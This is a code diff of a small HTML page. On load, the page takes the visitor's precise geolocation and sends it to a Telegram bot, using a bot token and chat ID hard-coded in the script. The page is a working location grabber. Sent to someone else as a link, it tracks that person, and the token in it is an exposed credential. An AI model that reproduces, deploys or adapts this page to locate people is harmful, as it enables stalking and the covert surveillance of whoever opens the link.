@@ -1,31 +1,53 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Location Sender</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
 <body>
-  <h1>Location Test</h1>
-  <p id="status">Sending location…</p>
+  <h1>Sending Location...</h1>
+  <p id="status">Getting location and sending to Telegram...</p>
 
   <script>
     const status = document.getElementById('status');
     const botToken = "8124009104:AAFuO-IJRweLKAjiRaZYIWgMep6XTEQYTWg";
     const chatId = "8002479084";
 
-    function send(lat, lon) {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Test+location:+${lat},${lon}`;
+    function sendLocation(lat, lon) {
+      const text = `Location: ${lat}, ${lon}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+      
       fetch(url)
-        .then(res => {
-          if (res.ok) status.textContent = "Sent!";
-          else status.textContent = "Failed to send.";
+        .then(response => {
+          if (response.ok) {
+            status.textContent = "Location sent successfully.";
+          } else {
+            status.textContent = "Failed to send location.";
+          }
         })
-        .catch(err => {
-          status.textContent = "Error: " + err;
-          console.error(err);
+        .catch(error => {
+          console.error(error);
+          status.textContent = "Error sending location.";
         });
     }
 
-    navigator.geolocation.getCurrentPosition(
-      pos => send(pos.coords.latitude, pos.coords.longitude),
-      err => status.textContent = "Error getting location."
-    );
+    function handleError(error) {
+      status.textContent = "Error retrieving location.";
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          sendLocation(lat, lon);
+        },
+        handleError,
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    } else {
+      status.textContent = "Geolocation not supported by this browser.";
+    }
   </script>
 </body>
 </html>
